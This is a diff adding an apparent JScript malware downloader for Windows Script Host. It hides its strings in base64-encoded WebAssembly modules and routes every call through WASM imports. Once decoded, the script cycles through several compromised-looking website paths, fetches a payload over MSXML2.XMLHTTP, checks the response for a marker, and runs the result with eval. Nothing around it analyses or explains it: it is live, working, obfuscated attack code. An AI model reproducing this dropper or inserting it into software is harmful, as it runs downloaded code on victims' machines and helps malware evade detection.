@@ -1,0 +1,166 @@
+const __universalAtob = function (b64Encoded) {
+    try {
+        let binary_string = atob(b64Encoded), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(b64Encoded, 'base64'));
+    }
+};
+const __callWasmBuffer = 'AGFzbQEAAAABhICAgAABYAAAAo+AgIAAAQNlbnYHaW1wRnVuYwAAA4KAgIAAAQAEhICAgAABcAAABYOAgIAAAQABB5GAgIAAAgZtZW1vcnkCAARkYXRhAAEKioCAgAABhICAgAAAEAAL';
+const __callWasmModule = new WebAssembly.Module((() => {
+    try {
+        let binary_string = atob(__callWasmBuffer), len = binary_string.length, bytes = new Uint8Array(len);
+        for (let i = 0; i < len; i++) {
+            bytes[i] = binary_string.charCodeAt(i);
+        }
+        return bytes;
+    } catch (err) {
+        return new Uint8Array(global.Buffer.from(__callWasmBuffer, 'base64'));
+    }
+})());
+const __wasmStringModules = ['AGFzbQEAAAAFg4CAgAABAAEGqYGAgAAefwBBAQt/AEEQC38AQRQLfwBBGgt/AEEcC38AQSILfwBBKAt/AEEuC38AQTILfwBBNAt/AEE4C38AQTwLfwBBwAALfwBBwgALfwBBygALfwBB2AALfwBBkAILfwBBrgILfwBB7AILfwBBmAMLfwBBxAMLfwBBgAQLfwBBigQLfwBBmgQLfwBBnAQLfwBBogQLfwBBqAQLfwBBrAQLfwBBrgQLfwBBsAQLB46CgIAAHwZtZW1vcnkCAAVkYXRhMAMABWRhdGExAwEFZGF0YTIDAgVkYXRhMwMDBWRhdGE0AwQFZGF0YTUDBQVkYXRhNgMGBWRhdGE3AwcFZGF0YTgDCAVkYXRhOQMJBmRhdGExMAMKBmRhdGExMQMLBmRhdGExMgMMBmRhdGExMwMNBmRhdGExNAMOBmRhdGExNQMPBmRhdGExNgMQBmRhdGExNwMRBmRhdGExOAMSBmRhdGExOQMTBmRhdGEyMAMUBmRhdGEyMQMVBmRhdGEyMgMWBmRhdGEyMwMXBmRhdGEyNAMYBmRhdGEyNQMZBmRhdGEyNgMaBmRhdGEyNwMbBmRhdGEyOAMcBmRhdGEyOQMdC66FgIAAHgBBAQsOTVNYTUwyLlhNTEhUVAAAQRALAlAAAEEUCwQlMkYAAEEaCwEAAEEcCwQlMkYAAEEiCwRHRVQAAEEoCwQlM0EAAEEuCwJwAABBMgsBAABBNAsCUwAAQTgLAmEAAEE8CwJUAABBwAALAQAAQcIACwZQSUxLVQAAQcoACw1GRkZGRkZGRkZGRkYAAEHYAAu2ATlMRDJ3NEcxaEUzeWUweUtYTXhJY1hZa1hmdFY3QTM4UXJwVUF6ZUpsdW1WbVdsbHBUWm02NDNnRHlpYnExNHlPNHQ4Sk1JczZyTkh0ejFaNHZiMzBURVVhNDNoU2gwMWRYRzR1endBNmwyZXlmUHJmRzJmVFdoVDJOTkN5d01LZmlmQXk3dlNYZDZJU3BhNnhxRTZ2RGJhaFBXT0NZaHlMc204UTk4aGVrWndUaTNaYndhVE0AAEGQAgsdY29uY291cnNkbGVtb25zLmNvbSUyRmltYWdlcwAAQa4CCz1tdXN0YWZha2VtYWxlcnR1cmsuY29tJTJGd3AtY29udGVudCUyRnVwbG9hZHMlMkYyMDE3JTJGMDMlMkYAAEHsAgsqcGlyb2dpbW9za3ZhLnJ1JTJGY29tcG9uZW50cyUyRmNvbV9zZXlyZXQAAEGYAwsqaWtpbmNpZWxlc3lhZXZpLmNvbSUyRndwLWFkbWluJTJGaW5jbHVkZXMAAEHEAws6ZGVtaXJiYXNldGlrZXRpLm5ldCUyRndwLWNvbnRlbnQlMkZ1cGxvYWRzJTJGMjAxNyUyRjAzJTJGAABBgAQLCGNvdW50ZXIAAEGKBAsOaHR0cCUzQSUyRiUyRgAAQZoECwEAAEGcBAsEJTJGAABBogQLBCUzRgAAQagECwJhAABBrAQLAQAAQa4ECwEAAEGwBAsFZXZhbAA='].map(__bytes => {
+    const bytesToUse = __universalAtob(__bytes);
+    return new WebAssembly.Instance(new WebAssembly.Module(bytesToUse));
+});
+const lS = (wI, pos, iWC) => {
+    let __str = '';
+    if (!Array.isArray(wI)) {
+        let __targetModule = __wasmStringModules[wI];
+        let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
+        const __stringKey = `data${ pos }`;
+        let __start = __targetModule.exports[__stringKey] - 1;
+        let __str = '';
+        let i = __start;
+        let __c = __mem[i++];
+        while (!(parseInt(__c) & 128) && __mem[i]) {
+            __str += __c;
+            __c = String.fromCharCode(__mem[i++]);
+        }
+        __str += __c;
+        __str = decodeURIComponent(__str.substring(1));
+        return __str;
+    } else {
+        for (const __wasmIndex of wI) {
+            let __targetModule = __wasmStringModules[__wasmIndex];
+            let __mem = new Uint8Array(__targetModule.exports.memory.buffer);
+            const __stringKey = `data${ pos }`;
+            let __start = __targetModule.exports[__stringKey] - 1;
+            let i = __start;
+            let __c = __mem[i++];
+            while (!(parseInt(__c) & 128) && __mem[i]) {
+                __str += __c;
+                __c = String.fromCharCode(__mem[i++]);
+            }
+            __str += __c;
+        }
+        __str = decodeURIComponent(__str.substring(1));
+        return __str;
+    }
+};
+function grohot(hunko, b1, b2, b3) {
+    (() => {
+        const __callInstance4 = new WebAssembly.Instance(__callWasmModule, {
+            env: {
+                impFunc: () => {
+                    hunko.open(b1, b2, b3);
+                }
+            }
+        });
+        const __exports = __callInstance4.exports;
+        return __exports.data();
+    })();
+}
+function fuuu(fuu1, fuu2) {
+    return fuu1.join(fuu2);
+}
+function muhter(kjg, lki) {
+    return kjg.split(lki);
+}
+var fijks = lS(0, 0);
+var dfs = WScript.CreateObject(fijks + lS(0, 1));
+var joshua = new Array(lS(0, 2) + lS(0, 3), lS(0, 4), lS(0, 5), lS(0, 6), lS(0, 7), lS(0, 8), lS(0, 9), lS(0, 10), lS(0, 11), lS(0, 12), lS(0, 13), lS(0, 14), lS(0, 15));
+var x = [
+    lS(0, 16),
+    lS(0, 17),
+    lS(0, 18),
+    lS(0, 19),
+    lS(0, 20)
+];
+var gyt = 0;
+var feni = joshua[12];
+while (true) {
+    if (gyt >= x.length) {
+        break;
+    }
+    try {
+        var ghyt = false;
+        var tjkh = x[gyt + 1 - 1];
+        var nami = lS(0, 21);
+        var zmei = lS(0, 22);
+        (() => {
+            const __callInstance3 = new WebAssembly.Instance(__callWasmModule, {
+                env: {
+                    impFunc: () => {
+                        grohot(dfs, joshua[1 + 1] + lS(0, 23), zmei + tjkh + lS(0, 24) + nami + lS(0, 25) + feni, ghyt);
+                    }
+                }
+            });
+            const __exports = __callInstance3.exports;
+            return __exports.data();
+        })();
+        (() => {
+            const __callInstance2 = new WebAssembly.Instance(__callWasmModule, {
+                env: {
+                    impFunc: () => {
+                        abatae(dfs);
+                    }
+                }
+            });
+            const __exports = __callInstance2.exports;
+            return __exports.data();
+        })();
+        var r = dfs.responseText;
+        var rima = 10 * 50;
+        var got = 50 + 450 + rima;
+        var fontu = r.length;
+        var emisogh = 12;
+        if (r.length > 1000 && r.indexOf(feni) - 1 > got - 1002) {
+            var guznam = fuuu(muhter(r, feni), lS(0, 26) + lS(0, 27));
+            (() => {
+                const __callInstance1 = new WebAssembly.Instance(__callWasmModule, {
+                    env: {
+                        impFunc: () => {
+                            jista(guznam + lS(0, 28));
+                        }
+                    }
+                });
+                const __exports = __callInstance1.exports;
+                return __exports.data();
+            })();
+            break;
+        }
+    } catch (e) {
+    }
+    ;
+    gyt++;
+}
+;
+function abatae(beeraa) {
+    (() => {
+        const __callInstance0 = new WebAssembly.Instance(__callWasmModule, {
+            env: {
+                impFunc: () => {
+                    beeraa.send();
+                }
+            }
+        });
+        const __exports = __callInstance0.exports;
+        return __exports.data();
+    })();
+}
+function jista(rasp) {
+    window[lS(0, 29, true)](rasp);
+}
